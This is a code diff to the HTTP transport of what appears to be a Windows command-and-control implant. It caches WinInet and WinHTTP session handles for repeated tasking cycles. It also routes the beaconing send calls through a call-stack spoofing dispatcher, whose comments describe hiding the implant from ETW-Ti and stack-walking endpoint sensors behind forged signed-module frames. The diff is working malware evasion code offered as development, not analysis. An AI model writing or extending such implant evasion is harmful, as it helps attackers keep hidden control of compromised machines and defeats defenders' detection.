@@ -4,9 +4,35 @@
 #include "common.h"
 #include "transport_http.h"
 
+// LACUNA synthetic-stack dispatch: egress calls route through the spoofer
+// (pivot primitive handles >4 args and wininet's shadow-home spills) when
+// compiled in, plain direct calls otherwise.
+#if defined(INCLUDE_EVASION_CALLSTACK_SPOOF) && defined(_WIN64)
+#include "evasion/callstack_spoof.h"
+#define ES_SPOOFED(inst, fn, n, ...) \
+    callstack_spoofed_call((inst), (PVOID)(fn), (n), ##__VA_ARGS__)
+#else
+#define ghost_chain_plant(inst)      ((void)0)
+#define ghost_chain_restore(inst)    ((void)0)
+#define ES_SPOOFED(inst, fn, n, ...) ((PVOID)(UINT64)(fn)(__VA_ARGS__))
+#endif
+
 #ifdef USE_WININET
 
 // ── WinInet transport ──────────────────────────────────────────────────────────
+
+// Session/connect handles are opened ONCE and reused for the process lifetime.
+// Opening a fresh session per request re-runs WinInet's preconfig (WPAD/DHCP)
+// proxy resolution every cycle - measured 19s+ stalls per request on the T2
+// VM (dump-verified freeze inside wininet on the second tasking cycle). The
+// handles are dropped on any request failure so the next cycle re-establishes.
+static PVOID g_http_session = NULL;
+static PVOID g_http_connect = NULL;
+
+static void http_drop_handles(PINSTANCE inst) {
+    if (g_http_connect) { inst->Win32.InternetCloseHandle(g_http_connect); g_http_connect = NULL; }
+    if (g_http_session) { inst->Win32.InternetCloseHandle(g_http_session); g_http_session = NULL; }
+}
 
 #define INTERNET_SERVICE_HTTP       3
 #define INTERNET_FLAG_SECURE        0x00800000
@@ -20,20 +46,23 @@ static BOOL _http_request(PINSTANCE inst, LPCSTR verb, LPCSTR path,
                           BYTE* body, DWORD body_len,
                           BYTE** response, DWORD* resp_len) {
     if (!inst->Win32.InternetOpenA) { TRACE(inst, "http: InternetOpenA unresolved"); return FALSE; }
-    TRACE(inst, "http: InternetOpenA calling");
 
-    HINTERNET hSession = inst->Win32.InternetOpenA(
-        inst->Http.user_agent, 0, NULL, NULL, 0);
-    if (!hSession) { TRACE(inst, "http: InternetOpen failed"); return FALSE; }
-    TRACE(inst, "http: InternetConnect calling");
-
-    HINTERNET hConnect = inst->Win32.InternetConnectA(
-        hSession, inst->Http.host, (WORD)inst->Http.port,
-        NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
-    if (!hConnect) {
-        TRACE(inst, "http: InternetConnect failed");
-        inst->Win32.InternetCloseHandle(hSession);
-        return FALSE;
+    if (!g_http_session) {
+        TRACE(inst, "http: InternetOpenA calling");
+        g_http_session = inst->Win32.InternetOpenA(
+            inst->Http.user_agent, 0, NULL, NULL, 0);
+        if (!g_http_session) { TRACE(inst, "http: InternetOpen failed"); return FALSE; }
+    }
+    if (!g_http_connect) {
+        TRACE(inst, "http: InternetConnect calling");
+        g_http_connect = inst->Win32.InternetConnectA(
+            g_http_session, inst->Http.host, (WORD)inst->Http.port,
+            NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+        if (!g_http_connect) {
+            TRACE(inst, "http: InternetConnect failed");
+            http_drop_handles(inst);
+            return FALSE;
+        }
     }
     TRACE(inst, "http: HttpOpenRequest calling");
 
@@ -42,10 +71,9 @@ static BOOL _http_request(PINSTANCE inst, LPCSTR verb, LPCSTR path,
         flags |= INTERNET_FLAG_SECURE;
 
     HINTERNET hRequest = inst->Win32.HttpOpenRequestA(
-        hConnect, verb, path, NULL, NULL, NULL, flags, 0);
+        g_http_connect, verb, path, NULL, NULL, NULL, flags, 0);
     if (!hRequest) {
-        inst->Win32.InternetCloseHandle(hConnect);
-        inst->Win32.InternetCloseHandle(hSession);
+        http_drop_handles(inst);
         return FALSE;
     }
 
@@ -55,13 +83,19 @@ static BOOL _http_request(PINSTANCE inst, LPCSTR verb, LPCSTR path,
                                        &sec_flags, sizeof(sec_flags));
     }
 
-    BOOL sent = inst->Win32.HttpSendRequestA(
+    // HttpSendRequestA blocks for the whole egress wait - the exact moment
+    // ETW-Ti/stack sensors snapshot the thread. Route it through the
+    // synthetic stack so every walked frame below wininet is a signed-
+    // module ghost, not a raw blob address. Args pass raw: the dispatcher's
+    // varargs read full slots and the callee consumes each at its declared
+    // width (same convention as HH_SYSCALL).
+    BOOL sent = (BOOL)(UINT_PTR)(UINT64)ES_SPOOFED(
+        inst, inst->Win32.HttpSendRequestA, 5,
         hRequest, NULL, 0, body, body_len);
     if (!sent) {
         TRACE(inst, "http: HttpSendRequest failed");
         inst->Win32.InternetCloseHandle(hRequest);
-        inst->Win32.InternetCloseHandle(hConnect);
-        inst->Win32.InternetCloseHandle(hSession);
+        http_drop_handles(inst);
         return FALSE;
     }
     TRACE(inst, "http: HttpSendRequest ok, reading");
@@ -77,8 +111,7 @@ static BOOL _http_request(PINSTANCE inst, LPCSTR verb, LPCSTR path,
             // realloc failed - free old buf and return error
             if (total_buf) es_free(inst, total_buf);
             inst->Win32.InternetCloseHandle(hRequest);
-            inst->Win32.InternetCloseHandle(hConnect);
-            inst->Win32.InternetCloseHandle(hSession);
+            http_drop_handles(inst);
             if (response) *response = NULL;
             if (resp_len) *resp_len = 0;
             return FALSE;
@@ -89,9 +122,8 @@ static BOOL _http_request(PINSTANCE inst, LPCSTR verb, LPCSTR path,
         read = 0;
     }
 
+    // keep session + connect cached; only the request handle is per-call
     inst->Win32.InternetCloseHandle(hRequest);
-    inst->Win32.InternetCloseHandle(hConnect);
-    inst->Win32.InternetCloseHandle(hSession);
 
     if (response) *response = total_buf;
     if (resp_len) *resp_len = total_size;
@@ -133,6 +165,17 @@ BOOL http_post_response(PINSTANCE inst, BYTE* data, DWORD data_len,
 
 #include <winhttp.h>
 
+// Session/connect opened once, reused for the process lifetime (see the
+// WinInet path comment - per-request session setup re-runs proxy resolution
+// and showed multi-second stalls on the T2 VM). Dropped on any failure.
+static HINTERNET g_wh_session = NULL;
+static HINTERNET g_wh_connect = NULL;
+
+static void wh_drop_handles(PINSTANCE inst) {
+    if (g_wh_connect) { inst->Win32.WinHttpCloseHandle(g_wh_connect); g_wh_connect = NULL; }
+    if (g_wh_session) { inst->Win32.WinHttpCloseHandle(g_wh_session); g_wh_session = NULL; }
+}
+
 static BOOL _http_request(PINSTANCE inst, LPCWSTR verb, LPCWSTR path,
                           BYTE* body, DWORD body_len,
                           BYTE** response, DWORD* resp_len) {
@@ -144,23 +187,25 @@ static BOOL _http_request(PINSTANCE inst, LPCWSTR verb, LPCWSTR path,
     wchar_t wua[256] = {0};
     inst->Win32.MultiByteToWideChar(CP_ACP, 0, inst->Http.user_agent, -1, wua, 256);
 
-    HINTERNET hSession = inst->Win32.WinHttpOpen(
-        wua, 0 /*WINHTTP_ACCESS_TYPE_DEFAULT_PROXY*/, NULL, NULL, 0);
-    if (!hSession) return FALSE;
-
-    HINTERNET hConnect = inst->Win32.WinHttpConnect(
-        hSession, whost, (WORD)inst->Http.port, 0);
-    if (!hConnect) {
-        inst->Win32.WinHttpCloseHandle(hSession);
-        return FALSE;
+    if (!g_wh_session) {
+        g_wh_session = inst->Win32.WinHttpOpen(
+            wua, 0 /*WINHTTP_ACCESS_TYPE_DEFAULT_PROXY*/, NULL, NULL, 0);
+        if (!g_wh_session) return FALSE;
+    }
+    if (!g_wh_connect) {
+        g_wh_connect = inst->Win32.WinHttpConnect(
+            g_wh_session, whost, (WORD)inst->Http.port, 0);
+        if (!g_wh_connect) {
+            wh_drop_handles(inst);
+            return FALSE;
+        }
     }
 
     DWORD flags = inst->Http.use_ssl ? 0x00800000 /*WINHTTP_FLAG_SECURE*/ : 0;
     HINTERNET hRequest = inst->Win32.WinHttpOpenRequest(
-        hConnect, verb, path, NULL, NULL, NULL, flags);
+        g_wh_connect, verb, path, NULL, NULL, NULL, flags);
     if (!hRequest) {
-        inst->Win32.WinHttpCloseHandle(hConnect);
-        inst->Win32.WinHttpCloseHandle(hSession);
+        wh_drop_handles(inst);
         return FALSE;
     }
 
@@ -170,19 +215,19 @@ static BOOL _http_request(PINSTANCE inst, LPCWSTR verb, LPCWSTR path,
                                      &sec_flags, sizeof(sec_flags));
     }
 
-    BOOL sent = inst->Win32.WinHttpSendRequest(
+    // Egress send on the synthetic stack (see the HttpSendRequestA site)
+    BOOL sent = (BOOL)(UINT_PTR)(UINT64)ES_SPOOFED(
+        inst, inst->Win32.WinHttpSendRequest, 7,
         hRequest, NULL, 0, body, body_len, body_len, 0);
     if (!sent) {
         inst->Win32.WinHttpCloseHandle(hRequest);
-        inst->Win32.WinHttpCloseHandle(hConnect);
-        inst->Win32.WinHttpCloseHandle(hSession);
+        wh_drop_handles(inst);
         return FALSE;
     }
 
     if (!inst->Win32.WinHttpReceiveResponse(hRequest, NULL)) {
         inst->Win32.WinHttpCloseHandle(hRequest);
-        inst->Win32.WinHttpCloseHandle(hConnect);
-        inst->Win32.WinHttpCloseHandle(hSession);
+        wh_drop_handles(inst);
         return FALSE;
     }
 
@@ -200,9 +245,8 @@ static BOOL _http_request(PINSTANCE inst, LPCWSTR verb, LPCWSTR path,
         total_size += read;
     }
 
+    // keep session + connect cached; only the request handle is per-call
     inst->Win32.WinHttpCloseHandle(hRequest);
-    inst->Win32.WinHttpCloseHandle(hConnect);
-    inst->Win32.WinHttpCloseHandle(hSession);
 
     if (response) *response = total_buf;
     if (resp_len) *resp_len = total_size;
